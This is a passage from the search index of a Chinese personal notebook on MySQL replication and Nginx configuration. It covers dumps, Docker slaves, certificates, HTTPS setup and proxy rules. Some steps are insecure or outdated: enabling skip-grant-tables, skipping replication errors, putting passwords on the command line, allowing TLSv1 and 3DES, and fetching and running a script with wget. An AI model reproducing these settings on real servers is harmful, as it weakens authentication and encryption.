\u770b\u770b\uff0c\u80fd\u91cd\u73b0\u95ee\u9898\uff08mysql\u88ab\u5173\u6389\u4e86\uff09\uff0c\u4e5f\u53d1\u73b0\u4e86\u62a5\u9519\u4fe1\u606f\uff1a mysql_upgrade : Got error : 2002 : Can 't connect to local MySQL server through socket ' /var/run/mysqld/ mysqld . sock ' ( 2 ) while connecting to the MySQL server Upgrade process encountered error and will not continue . \u7136\u540e\u5c31\u67e5\u8fd9\u4e2a\u62a5\u9519\uff0c\u53d1\u73b0\u4e86\u8fd9\u4e2a\uff1ahttps://github.com/chef-cookbooks/mysql/issues/466 \u4eba\u5bb6\u7684\u89e3\u51b3\u65b9\u6848\u662f\uff1a systemctl enable mysql \uff0c\u7136\u800c\u6211\u6267\u884c\u53c8\u9047\u5230\u4e86systemd\u7684\u62a5\u9519\uff1a Failed to execute operation: Invalid argument \u6700\u7ec8\u89e3\u51b3\u65b9\u6848\u5c31\u662f\u5148disable\u4e00\u4e0b systemctl disable mysql systemctl enable mysql apt-get install -f","title":"\u89e3\u51b3ubuntu16.04\u4e0amysql\u88abapt upgrade\u81ea\u52a8\u5173\u95ed\u7684\u95ee\u9898"},{"location":"MySQL/#null0","text":"\u7528\u51fd\u6570IFNULL\uff0c\u5199\u6cd5\u5c31\u662f IFNULL(\u5217\u540d, 0) \u4e3e\u4e2a\u4f8b\u5b50 select sum(IFNULL(score, 0)) from runs;","title":"NULL\u8f6c0"},{"location":"MySQL/#mysqlslave","text":"master\u542f\u7528binlog\u914d\u7f6eserver-id\uff1bmaster\u7528mysqldump\u5bfc\u51fa\u6570\u636e\u5e93\uff1bslave\u5bfc\u5165\uff0c\u5f00\u59cbslave","title":"\u7ed9MySQL\u589e\u52a0\u4e00\u4e2aslave\u505a\u4e3b\u4ece\u590d\u5236"},{"location":"MySQL/#master","text":"GRANT REPLICATION SLAVE ON *.* TO 'slave_user'@'%' IDENTIFIED BY 'password'; FLUSH PRIVILEGES;","title":"master\u521b\u5efa\u7528\u6237"},{"location":"MySQL/#masterbinlog","text":"/etc/mysql/conf.d/master.cnf [mysqld] server-id = 1 log-bin = mysql-bin.log innodb_flush_log_at_trx_commit = 1 sync_binlog = 1","title":"master\u542f\u7528binlog"},{"location":"MySQL/#_7","text":"\u7531\u4e8ebinlog\u662f\u5728\u5df2\u7ecf\u6709\u6570\u636e\u4e4b\u540e\u624d\u5f00\u542f\u7684\uff0c\u800cmysql\u4e0d\u4f1a\u81ea\u5df1\u6267\u884c\u5168\u91cf\u540c\u6b65\uff0c\u5c31\u53ea\u80fd\u9760\u624b\u5de5\u642c\u8fd0sql\u6587\u4ef6\u54af \u8de8\u5730\u57df\u590d\u5236\u7f51\u901f\u662f\u9650\u5236\u56e0\u7d20\uff0c\u5c31\u75287z\u538b\u7f29\u4e86 mysqldump -h 127.0.0.1 -P 3306 -u root -p --opt --single-transaction --comments --hex-blob --dump-date --no-autocommit --all-databases --master-data | 7z a -si dbdump.sql.7z 7z x -so dbdump.sql.7z | mysql -h 127.0.0.1 -u root -p \u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528ssh\u548c\u7ba1\u9053\u64cd\u4f5c\uff0c\u5c31\u4e0d\u7528\u521b\u5efa\u6587\u4ef6\u4e86\uff1a ssh master_server \"mysqldump -h 127.0.0.1 -P 3306 -u root -ppassword --opt --single-transaction --comments --hex-blob --dump-date --no-autocommit --all-databases --master-data |gzip\" | zcat | mysql -h 127.0.0.1 -u root -ppassword \u5176\u4e2d --master-data \u5f88\u91cd\u8981\uff0c\u5bfc\u51fa\u7684\u65f6\u5019\u5c31\u81ea\u52a8\u5e26\u4e0a\u4e86master\u7684\u4fe1\u606f\uff0c\u65e0\u9700\u518d\u624b\u5de5\u8bb0\u5f55 CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000002', MASTER_LOG_POS=15410;","title":"\u642c\u8fd0\u6570\u636e\u5e93"},{"location":"MySQL/#slave","text":"\u5b9e\u9645\u4f7f\u7528\u4e2d\u5f88\u5bb9\u6613\u9047\u5230duplicate key\u7684\u95ee\u9898\uff0c\u5bfc\u81f4slave\u7ebf\u7a0b\u505c\u4f4f\uff0c\u914d\u7f6e\u76f4\u63a5\u5ffd\u7565\u8fd9\u4e2a\u9519\u8bef \u53c2\u8003 server-id = 2 relay-log = mysql-relay-bin.log log_bin = mysql-bin.log slave-skip-errors = 1062 CHANGE MASTER TO MASTER_HOST='12.34.56.789',MASTER_USER='slave_user', MASTER_PASSWORD='password'; START SLAVE; SHOW SLAVE STATUS\\G","title":"\u914d\u7f6eslave"},{"location":"MySQL/#docker","text":"https://github.com/bitnami/bitnami-docker-mysql \u4f46\u8fd9\u4e2a\u955c\u50cf\u4e5f\u4e0d\u4f1a\u5e2e\u4f60\u81ea\u52a8\u5b8c\u6210mysqldump\uff0c\u4f46\u914d\u7f6e\u4e00\u4e2aslave\u8fd8\u662f\u5f88\u7701\u5fc3\u7684 \u6ce8\u610f\u6743\u9650\u914d\u7f6e\uff0c\u5982\u679c\u539f\u672c\u6570\u636e\u6587\u4ef6\u5939\u4e0d\u5b58\u5728\uff0cDocker\u521b\u5efa\u7684\u662froot\u7528\u6237\u624d\u80fd\u8bfb\u5199\uff0c\u5bfc\u81f4\u5bb9\u5668\u76f4\u63a5\u9000\u51fa\uff0c\u5751\u7684\u5730\u65b9\u5728\u4e8e\u6ca1\u6709\u62a5\u9519\u4fe1\u606f mkdir - p / srv / mysql - slave / data chown 1001 / srv / mysql - slave / data - R docker run - it - v / srv / mysql - slave / my . cnf : / opt / bitnami / mysql / conf / my . cnf : ro - v / srv / mysql - slave / data : / bitnami / mysql / data \\ --name mysql-slave -e MYSQL_REPLICATION_MODE=slave -e MYSQL_REPLICATION_USER=slave_user -e MYSQL_REPLICATION_PASSWORD=password \\ - e MYSQL_MASTER_HOST = 12 . 34 . 56 . 789 - e MYSQL_MASTER_PORT_NUMBER = 3306 \\ - e MYSQL_MASTER_ROOT_USER = slave_user - e MYSQL_MASTER_ROOT_PASSWORD = password \\ bitnami / mysql : 5 . 7 \u5176\u4e2dMYSQL_MASTER_ROOT_USER\u867d\u7136\u4eba\u5bb6\u8bf4\u8981root\u7528\u6237\uff0c\u5b9e\u9645\u4e0a\u4ee3\u7801\u91cc\u53ea\u662f\u7528\u6765select 1\uff0c\u6240\u4ee5\u7528slave_user\u5373\u53ef\uff0c\u53c2\u89c1 \u6211\u63d0\u7684issue \u5bb9\u5668\u542f\u52a8\u540e\u4e00\u822c\u4f1a\u7531\u4e8emaster\u7684binlog\u4e0d\u5b8c\u6574\u6267\u884csql\u5931\u8d25\uff08\u8868\u4e0d\u5b58\u5728\uff09\uff0c\u9700\u8981\u7ee7\u7eed\u64cd\u4f5c\uff1a \u4fee\u6539my.cnf\u5728 [mysqld] \u589e\u52a0 skip-grant-tables \u6ce8\u610f\u590d\u6570\uff0c\u6765\u4fdd\u8bc1slave\u53ef\u4ee5\u8fde\u4e0a\u8fdb\u884c\u64cd\u4f5c \u7136\u540e\u6267\u884csql\u8bed\u53e5 STOP SLAVE; \u518d\u6267\u884c\u4e0a\u8ff0\u642c\u8fd0\u6570\u636e\u5e93\u7684\u64cd\u4f5c\uff0c\u5bfc\u5165\u5b8c\u6210\u540e START SLAVE \u4f7f\u7528 show slave status; \u67e5\u770bslave\u72b6\u6001 \u53e6\u5916\uff0c\u914d\u5408autossh\u548cssh\u7684\u7aef\u53e3\u8f6c\u53d1\u53ef\u4ee5\u907f\u514d\u5c06mysql\u7aef\u53e3\u66b4\u9732\u5728\u5916\uff1a autossh - M 0 - o ServerAliveInterval = 30 - o ServerAliveCountMax = 3 - L 172.17.0.1 : 3306 : 127.0.0.1 : 3306 user @12.34.56.789 \u76f8\u5e94\u5730\uff0cslave\u914d\u7f6e\u7684master\u5730\u5740\u6539\u4e3a172.17.0.1","title":"Docker\u955c\u50cf"},{"location":"MySQL/#mysql","text":"Learned from: https://federico-razzoli.com/why-mysql-tables-need-a-primary-key InnoDB\u4e2d\u975e\u4e3b\u952e\u7684\u7d22\u5f15\u662f\u989d\u5916\u5b58\u50a8\u7684\uff0c\u4f7f\u7528\u7d22\u5f15\u67e5\u8be2\u5148\u67e5\u5230\u4e3b\u952e\uff0c\u518d\u7528\u4e3b\u952e\u67e5\u6570\u636e\u2014\u2014\u6ca1\u6709\u4e3b\u952e\u7684\u67e5\u8be2\u4f1a\u6162\u4e00\u4e9b \u6ca1\u6709\u4e3b\u952e\u4e5f\u6ca1\u6709\u9690\u5f0f\u4e3b\u952e\uff08\u521b\u5efa\u8868\u7684\u65f6\u5019\u6307\u5b9a\u7684NOT NULL UNIQUE\u5217\uff09\u4f1a\u81ea\u52a8\u4f7f\u7528\u9012\u589e\u7684row id\u4f5c\u4e3a\u4e3b\u952e\uff0c\u4f46\u9012\u589e\u9700\u8981\u5168\u5c40\u9501 dict_sys->mutex \u2014\u2014\u591a\u4e2a\u8868\u540c\u65f6\u63d2\u5165\u65f6\u6027\u80fd\u4e0b\u964d \u5728binlog\u4e2d\u5220\u9664\u64cd\u4f5c\u6709\u4e3b\u952e\u53ea\u9700\u8981\u8bb0\u5f55\u4e3b\u952e\uff0c\u6ca1\u6709\u4e3b\u952e\u9700\u8981\u8bb0\u5f55\u6240\u6709\u5185\u5bb9\u2014\u2014binlog\u66f4\u5927 \u4ece\u673a\u6267\u884cbinlog\u4e2d\u7684delete\u64cd\u4f5c\uff0c\u6bcf\u6b21\u64cd\u4f5c\u90fd\u9700\u8981\u626b\u63cf\u5168\u8868\u2014\u2014\u6027\u80fd\u663e\u8457\u4e0b\u964d \u96c6\u7fa4\u5982Galera\u9700\u8981\u7b49\u5f85\u6240\u6709\u8282\u70b9commit\u624d\u4f1a\u7ed9\u5ba2\u6237\u7aef\u8fd4\u56de\u6210\u529f\u2014\u2014\u7528\u6237\u611f\u53d7\u5230\u5f88\u9ad8\u7684\u5ef6\u8fdf","title":"\u4e3a\u4ec0\u4e48MySQL\u8868\u5fc5\u987b\u8981\u6709\u4e3b\u952e"},{"location":"Nginx/","text":"Nginx \u00b6 \u8bb0\u5f55\u7528\u5230\u7684\u914d\u7f6e\uff0c\u8bf4\u4e0d\u5b9a\u4f60\u4e5f\u80fd\u9047\u5230\u8fd9\u4e9b\u7279\u6b8a\u9700\u6c42\u5462~ Nginx\u601d\u8003\u9898 \u00b6 \u8bf7\u4ee5\u6279\u5224\u7684\u773c\u5149\u9605\u8bfb\u4ee5\u4e0b\u94fe\u63a5\u6216\u8005\u81ea\u884cgoogle\uff0c\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898\uff1a http://www.nginx.cn/591.html nginx.conf\u5728\u4f60Linux\u7684\u4ec0\u4e48\u76ee\u5f55\u4e0b\uff1f\u7528\u4ec0\u4e48\u547d\u4ee4\u77e5\u9053\u7684\uff1f\u4fee\u6539\u914d\u7f6e\u540e\u901a\u8fc7\u4ec0\u4e48\u547d\u4ee4\u91cd\u65b0\u8f7d\u5165\u914d\u7f6e\uff1f nginx.conf\u5206\u4e3a\u51e0\u4e2a\u90e8\u5206\uff1f\u6211\u4eec\u9700\u8981\u5173\u6ce8\u7684\u662f\u54ea\u4e2a\uff1f nginx.conf\u4e2d\u600e\u4e48\u8868\u793a\u6ce8\u91ca\u884c\uff1f\u662f\u5426\u7559\u610f\u5230include\u7684\u884c\u8f7d\u5165\u4e86\u989d\u5916\u7684\u914d\u7f6e\u6587\u4ef6\uff1f \u5982\u4f55\u589e\u52a0\u4e00\u4e2a\u865a\u62df\u4e3b\u673a\uff0c\u6839\u636e\u57df\u540d\u6765\u533a\u5206\u8bbf\u95ee\u4e0d\u540c\u7684\u7f51\u7ad9\uff1f\u8bbf\u95ee\u8005\u76f4\u63a5\u8bbf\u95eeIP\u6216\u8005\u9519\u8bef\u7684\u57df\u540d\u4f1a\u5339\u914d\u5230\u9ed8\u8ba4\u7f51\u7ad9\uff0c\u600e\u4e48\u914d\u7f6e\u9ed8\u8ba4\u7f51\u7ad9\uff1f \u8fd9\u4e9b\u662f\u66f4\u4e3a\u8fdb\u9636/\u53d1\u6563\u7684\u95ee\u9898\uff1a \u9759\u6001\u5185\u5bb9\uff1aroot\u4e0ealias\u6709\u4f55\u533a\u522b\uff1f\u8bbf\u95ee403\u4e86\u600e\u4e48\u529e\uff1f \u52a8\u6001\u5185\u5bb9/\u53cd\u5411\u4ee3\u7406\uff1a\u5982\u4f55\u505a\u8d1f\u8f7d\u5747\u8861\u3001\u6587\u672c\u66ff\u6362\uff1f \u5168\u7ad9https\u548cHTTP/2.0\u600e\u4e48\u914d\u7f6e\uff1f Nginx\u662f\u5426\u6709\u5fc5\u8981\u4f5c\u4e3a\u4e00\u4e2aDocker\u5bb9\u5668\u8fd0\u884c\uff1fCentOS\u4e0bNginx\u955c\u50cf\u5f88\u5927\uff0c\u600e\u4e48 \u51cf\u5c0f\u955c\u50cf\u5927\u5c0f \uff1f Nginx\u7684worker\u8fdb\u7a0b\u4e00\u822c\u4e0d\u662froot\u6743\u9650\u7684\uff0c\u90a3\u662f\u600e\u4e48\u76d1\u542c\u523080\u7aef\u53e3\u7684\uff1f Nginx\u5728\u5904\u7406\u9ad8\u5e76\u53d1\u7684\u65f6\u5019\u53c2\u6570\u5982\u4f55\u8c03\u4f18\uff1f \u5982\u4f55\u5728Nginx\u5c42\u9762\u62e6\u622asql\u6ce8\u5165\u3001\u5bc6\u7801\u7206\u7834\u7b49\u5b89\u5168\u98ce\u9669\uff1f VeryNginx \u666e\u901a\u8d44\u6e90\u5141\u8bb8POST \u00b6 error_page 405 = 200 @405 ; \u4e0d\u5e26\u540e\u7f00\u7684\u6587\u4ef6\u5f53\u6210php\u6267\u884c \u00b6 \u8fd9\u91cc\u7684\u601d\u8def\u662f\u7528\u53cd\u5411\u4ee3\u7406\u7684\u65b9\u5f0f\u7b80\u5355\u5b9e\u73b0 location /path/something { proxy_pass http://yourdomain/path/something.php; proxy_method GET; } \u987a\u5e26\u62d2\u7edd\u6389\u5bf9php\u540e\u7f00\u7684\u731c\u6d4b\uff1a location = /path/something.php { if ($remote_addr != '\u670d\u52a1\u5668\u81ea\u8eabIP') { return 404; } include fastcgi.conf; } http\u8df3\u8f6c\u5230https \u00b6 location /{ rewrite ^ https://$host$request_uri? permanent; } \u83b7\u5f97Let\u2019s encrypt\u514d\u8d39https\u8bc1\u4e66 \u00b6 \u4e3a\u7b80\u5316\u64cd\u4f5c\uff0c\u6211\u5199\u4e86\u4e00\u4e2a\u66f4\u52a0\u65b9\u4fbf\u7684 getcert.py \u4f7f\u7528\u65b9\u6cd5\uff1a \u00b6 \u7b2c\u4e00\u6b65\uff1a \u00b6 \u914d\u7f6e\u76f8\u5e94\u7f51\u7ad9\u7684nginx conf\u4e2d\u7684server\u91cc\u9762\uff0c\u52a0\u5165\u8fd9\u4e2a\uff1a location /.well-known/acme-challenge { alias \u4fdd\u5b58\u5bc6\u94a5\u7684\u76ee\u5f55; try_files $uri =404; } \u8bb0\u5f97\u8fd0\u884c\u540e nginx -s reload \u7b2c\u4e8c\u6b65\uff0c\u8fd0\u884c\u6211\u7684getcert.py\uff08\u521b\u5efa\u79c1\u94a5\u5e76\u63d0\u4ea4\u7533\u8bf7\uff09\uff1a \u00b6 pushd \u4e0a\u8ff0\u4fdd\u5b58\u5bc6\u94a5\u7684\u76ee\u5f55 wget https://raw.githubusercontent.com/zjuchenyuan/notebook/master/code/getcert.py ./getcert.py \u6587\u4ef6\u540d\u79f0 \u8be5\u8bc1\u4e66\u5305\u542b\u7684\u57df\u540d\u5217\u8868 \u4f8b\u5982\u8fd9\u6837\u5c31\u80fd\u83b7\u5f97\u4e00\u5f20\u6db5\u76d6zjusec.com\u4e09\u4e2a\u5b50\u57df\u540d\u7684\u8bc1\u4e66\uff1a ./getcert.py zjusec zjusec.com,www.zjusec.com,web.zjusec.com \u5177\u4f53\u6765\u8bf4\uff0c\u8fd9\u4e2a\u811a\u672c\u4f1a\u81ea\u52a8\u4e0b\u8f7d\u9700\u8981\u7684acme_tiny.py\u548cLet\u2019s Encrypt\u7684\u4e2d\u95f4\u8bc1\u4e66\uff0c\u8c03\u7528openssl\u521b\u5efa\u8d26\u53f7\u79c1\u94a5\u548c\u7ad9\u70b9\u79c1\u94a5\uff0c\u6700\u7ec8\u4ea7\u751f \u540d\u79f0.crt \u540d\u79f0.key \u3002 \u4f7f\u7528acme.sh\u83b7\u5f97\u6cdb\u57df\u540d\u8bc1\u4e66 \u00b6 \u6cdb\u57df\u540d\u89e3\u6790\u9700\u8981\u4f7f\u7528DNS\u9a8c\u8bc1\uff0c\u5c31\u9700\u8981\u4f7f\u7528DNS\u670d\u52a1\u7684API\uff0c\u5373\u4f7f\u6ca1\u6709API\u53ea\u8981\u914d\u7f6e\u4e00\u6761CNAME\u6307\u5411\u4e00\u4e2a\u6709DNS API\u7684\u57df\u540d\u5373\u53ef \u9996\u5148\u83b7\u5f97acme.sh git clone https://github.com/Neilpang/acme.sh \u7136\u540e\u62ff\u5230cloudflare\u7684API Key\uff0c\u6258\u7ba1b.com \u9700\u8981\u62ff\u5230\u80fd\u7528\u4e8ea.com\u548c*.a.com\u7684\u8bc1\u4e66\uff0c\u5148\u914d\u7f6eCNAME\uff08\u53c2\u8003\uff1ahttps://github.com/Neilpang/acme.sh/wiki/DNS-alias-mode\uff09 _acme-challenge.a.com => _acme-challenge.b.com \u6267\u884c\u547d\u4ee4\u54af\uff1a CF_Key=xxx CF_Email=xxx@example.com /root/acme.sh/acme.sh --issue --dns dns_cf -d '*.a.com' --challenge-alias b.com -d a.com --dnssleep 10 --fullchain-file /root/acom.crt --key-file /root/acom.key -f \u89e3\u91ca\uff1a\u524d\u9762\u4e24\u4e2a\u662f\u914d\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u4f7f\u7528cloudflare\u6240\u4ee5\u6307\u5b9a\u2013dns dns_cf\uff0c\u7136\u540e-d \u2026 \u2013challenge-alias \u2026 -d \u2026 \u6307\u5b9a\u57df\u540d\u548c\u9a8c\u8bc1\u7528\u7684\u57df\u540d\uff0c\u2013dnssleep 10\u7b49\u5f8510\u79d2DNS\u751f\u6548\uff08\u9ed8\u8ba4120\u79d2\u6ca1\u5fc5\u8981\uff09\uff0c\u2013fullchain-file\u548c\u2013key-file \u6307\u5b9a\u751f\u6210\u540e\u628a\u8bc1\u4e66\u6587\u4ef6\u548c\u5bc6\u94a5\u6587\u4ef6\u62f7\u8d1d\u5230\u54ea \u914d\u7f6e\u5b89\u5168\u7684https \u00b6 \u6b64\u5904\u53c2\u8003 https://z.codes/ssl-lab-a-plus-configuration-for-nginx/ \u9996\u5148\u4ecePPA\u5b89\u88c5nginx, \u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1\u6700\u65b0\u7248 add-apt-repository ppa:nginx/stable apt update apt install nginx \u521b\u5efaDH\u968f\u673a\u8d28\u6570\uff1a openssl dhparam -out /etc/ssl/dhparams.pem 2048 \u521b\u5efa/etc/nginx/https.conf\uff1a listen 443 ssl http2 ; add_header Strict - Transport - Security \"max-age=31536000\" always ; add_header Upgrade - Insecure - Requests \"1\" ; add_header Content - Security - Policy \"upgrade-insecure-requests\" ; ssl_dhparam / etc / ssl / dhparams . pem ; ssl_stapling on ; ssl_stapling_verify on ; resolver 8.8.8.8 8.8.4.4 114.114.114.114 valid = 60 s ; resolver_timeout 2 s ; ssl_protocols TLSv1 TLSv1 .1 TLSv1 .2 ; ssl_ciphers 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA' ; ssl_session_cache shared : SSL : 10 m ; ssl_session_timeout 24 h ; ssl_buffer_size 1400 ; ssl_prefer_server_ciphers on ; keepalive_timeout 600 s ; location ~* / \\ .( ? ! well - known \\ / ) { deny all ; } location ~* ( ? :\\ .( ? : bak | conf | dist | fla | in [ ci ]| log | psd | sh | sql | sw [ op ] ) |~ ) $ { deny all ; } include mime . types ; \u4e3a\u9700\u8981\u542f\u7528https\u7684\u7ad9\u70b9\uff0c\u5728/etc/nginx/sites-enabled/\u4e2d\u5199\u5165conf\u6587\u4ef6 server { listen 443; server_name \u57df\u540d1 \u57df\u540d2; access_log /tmp/access.log; error_log /tmp/error.log; ssl_certificate \u5bc6\u94a5\u76ee\u5f55/\u540d\u79f0.crt; ssl_certificate_key \u5bc6\u94a5\u76ee\u5f55/\u540d\u79f0.key; include https.conf \u5176\u4ed6\u914d\u7f6e\u3002\u3002\u3002 } \u53cd\u5411\u4ee3\u7406\u4e4b\u66ff\u6362\u7f51\u9875\u3001JS\u4e2d\u7684\u6587\u672c \u00b6 \u4f7f\u7528\u6a21\u5757ngx_http_substitutions_filter_module\uff0c\u89c1Github: https://github.com/yaoweibin/ngx_http_substitutions_filter_module \u9700\u8981\u91cd\u65b0\u7f16\u8bd1nginx\uff0cTip: nginx -V \u547d\u4ee4\u53ef\u4ee5\u663e\u793a\u5f53\u524d\u7248\u672c\u7684nginx\u7684\u7f16\u8bd1\u53c2\u6570 \u7f16\u8bd1\u540e\u5c31\u53ef\u4ee5\u7528\u5566\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u5fae\u4fe1\u7684\u516c\u4f17\u53f7\u6587\u7ae0\u9875\u9762\u4e3a\u4e86\u8282\u7701\u7528\u6237\u6d41\u91cf\uff0c\u56fe\u7247\u662f\u628a\u9875\u9762\u6eda\u52a8\u81f3\u6240\u5728\u4f4d\u7f6e\u624d\u52a0\u8f7d\u7684\uff0c\u4ee3\u7801\u4e0a\u7684\u5dee\u5f02\u5c31\u662fimg\u6807\u7b7e\u672c\u5e94\u662fsrc\u7684\u6539\u6210\u4e86data-src\uff0c\u8fd9\u91cc\u6211\u4eec\u8981\u505a\u4e00\u4e2a\u5fae\u4fe1\u7684\u53cd\u5411\u4ee3\u7406\u7f51\u7ad9\uff0c\u628adata-src\u66ff\u6362\u6210src\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u6240\u6709\u56fe\u7247\uff08\u5514\u3002\u3002\u3002\u5176\u5b9e\u8fd8\u4e0d\u591f\uff0c\u8fd8\u9700\u8981\u8003\u8651\u9632\u76d7\u94fe\u7684\u95ee\u9898\uff09\uff1b\u5e76\u4e14\u8bbe\u7f6eMIME\u7c7b\u578b\u5305\u542bJavascript subs_filter \u9700\u8981\u66ff\u6362\u6389\u7684\u5185\u5bb9 \u66ff\u6362\u540e\u7684\u6587\u672c; subs_filter data-src src; subs_filter_types application/x-javascript text/javascript appliation/x-javascript; \u7981\u6b62git\u76ee\u5f55\u8bbf\u95ee \u00b6 \u5728server\u5757\u4e2d\u6dfb\u52a0\uff1a location ~ /\\. { return 404; } \u76f8\u5e94\u7684Apache\u53ef\u4ee5\u5728httpd.conf\u4e2d\u6dfb\u52a0\uff1a RedirectMatch 404 /\\.git root\u4e0ealias\u7684\u533a\u522b \u00b6 From: http://stackoverflow.com/questions/10631933/nginx-static-file-serving-confusion-with-root-alias \u4e00\u53e5\u8bdd\u6982\u62ec\uff0croot\u5bf9\u5e94\u7684\u76ee\u5f55\u4f1a\u52a0\u4e0alocation\u90e8\u5206\u53bb\u627e\u6587\u4ef6\uff0c\u800calias\u5219\u4e0d\u4f1a location / static / { root / var / www / app / static / ; autoindex off ; } \u5982\u679c\u6211\u4eec\u8fd9\u4e48\u5199\uff0c\u90a3\u4e48\u8bbf\u95eestatic\u76ee\u5f55\u4e0b\u7684a.jpg\u5c31\u4f1a\u53bb\u627e/var/www/app/static/static\u76ee\u5f55\u4e0b\u7684a.jpg\uff0c\u5982\u679c\u6ca1\u6709\u8fd9\u4e2astatic/static\u5c31\u4f1a404 \u89e3\u51b3\u65b9\u6cd5\u6709\u4e24\u79cd\uff1a \u5982\u679clocation\u4e2d\u7684static\u5c31\u662f\u771f\u5b9e\u76ee\u5f55\uff0croot\u4e2d\u5c31\u4e0d\u8981\u5199static\u4e86 location / static / { root / var / www / app / ; autoindex off ; } \u6216\u8005\u7528alias\u5c31\u4e0d\u4f1a\u518d\u52a0\u4e0alocation\u7684\u90e8\u5206\uff1a location / static / { alias / var / www / app / static / ; autoindex off ; } \u5728bash on win10\u4e0a\u4f7f\u7528Nginx \u00b6 \u4e0eLinux\u4e2d\u5b89\u88c5\u7c7b\u4f3c\uff0c\u53ea\u8981 apt-get install nginx \u5373\u53ef\uff0c\u4f46\u53ef\u80fd\u4f1a\u53d1\u73b0nginx\u5e76\u4e0d\u6b63\u5e38\u5de5\u4f5c\uff0c\u65e5\u5fd7\u4e2d\u662f\u8fd9\u6837\u7684\uff1a [ alert ] 79 #0 : ioctl ( FIOASYNC ) failed while spawning \"worker process\" ( 22 : Invalid argument ) \u89e3\u51b3\u65b9\u6848\uff1a\u5728/etc/nginx/nginx.conf\u4e2d\u6dfb\u52a0\u4e00\u884c\uff1a master_process off; \u4f7f\u4e0a\u4e00\u7ea7\u670d\u52a1\u77e5\u9053\u7528\u6237IP \u00b6 proxy_set_header realip $remote_addr; \u8fd9\u6837\u8bbe\u7f6e\u540e\uff0cNginx\u53cd\u5411\u4ee3\u7406\u4e0a\u4e00\u7ea7\u670d\u52a1\u4f1a\u52a0\u4e0arealip\u8fd9\u4e2a\u5934\uff0c\u4ece\u800c\u4f20\u9012\u7528\u6237\u771f\u5b9e\u7684IP\uff08\u5982\u679c\u662f\u4ee3\u7406\u5219\u662f\u4ee3\u7406\u7684IP\uff09 Nginx\u5141\u8bb8\u5217\u76ee\u5f55 \u00b6 \u52a0\u4e0a autoindex on \u5373\u53ef\uff0c\u540e\u4e24\u9879\u662f\u4e3a\u4e86 \u663e\u793a\u670d\u52a1\u5668\u65f6\u95f4\u800c\u4e0d\u662fGMT\u65f6\u95f4 \u4ee5\u53ca \u4ee5kB,MB,GB\u4e3a\u5355\u4f4d\u663e\u793a\u5927\u5c0f\u800c\u4e0d\u662f\u786e\u5207\u7684\u5b57\u8282\u6570 location / { autoindex on; autoindex_localtime on; autoindex_exact_size off; } \u5b89\u5168\u5730\u4f7f\u7528SeaweedFS\u4f5c\u4e3a\u56fe\u7247\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668 \u00b6 \u60f3\u57fa\u4e8eseaweedfs\u5b9e\u73b0\u4e00\u4e2a\u53cd\u5411\u4ee3\u7406\u7684\u7f13\u5b58\u670d\u52a1\u5668\uff0cNginx\u5148\u8bf7\u6c42A\u670d\u52a1\u5668(weedfs filer)\uff0c\u5982\u679c\u8fd8\u6ca1\u6709\u5b58\u4e0b\u8fd9\u5f20\u56fe\u7247(\u8fd4\u56de404)\uff0c\u5207\u81f3B\u670d\u52a1\u5668(Python flask)\u53bb\u722c\u53d6\u56fe\u7247\u5e76\u4f20\u81f3weedfs\u5b58\u50a8 seaweedfs\u7684filer\u63d0\u4f9b\u4e86\u6309\u81ea\u5df1\u6307\u5b9a\u7684\u8def\u5f84\u4e0a\u4f20\u4e0b\u8f7d\u529f\u80fd\uff08\u5bf9\u8c61\u5b58\u50a8\uff09\uff0c\u5c31\u4e0d\u9700\u8981\u518d\u81ea\u5df1\u8003\u8651\u600e\u4e48\u5b58\u50a8path\u4e0efid\u7684\u5bf9\u5e94\u5173\u7cfb\u4e86\uff0c\u76f4\u63a5\u6309\u722c\u53d6\u6e90\u7684\u8def\u5f84\u5b58\u50a8\u5373\u53ef \u5b9e\u73b0\uff1a Nginx\u914d\u7f6e \u00b6 \u5728http\u6bb5\u4e2d\u6dfb\u52a0upstream \u00b6 \u6ce8\u610f\u628aB\u670d\u52a1\u5668\u8bbe\u7f6e\u4e3abackup \u4e0d\u8981\u53c2\u4e0e\u9ed8\u8ba4\u8d1f\u8f7d\u5747\u8861 upstream up { server weedfs:8888; server 127.0.0.1:80 backup; } server\u6bb5\u914d\u7f6e \u00b6 \u6211\u5e0c\u671b\u8bbf\u95ee /images/hhh.jpg \u5b9e\u9645\u8bbf\u95ee http://weedfs:8888/my_images/hhh.jpg \u5173\u952e\u5c31\u662f proxy_next_upstream location /images/ { rewrite ^/images(/.*)$ /my_images$1 break; proxy_pass http://up; proxy_next_upstream http_404; proxy_hide_header Content-Type; add_header Content-Type image/jpeg; limit_except GET { deny all; } } \u5728seaweedfs\u8fd4\u56de404\u7684\u65f6\u5019\u4f1a\u7ee7\u7eed\u8bf7\u6c42 http://127.0.0.1/my_images/hhh.jpg 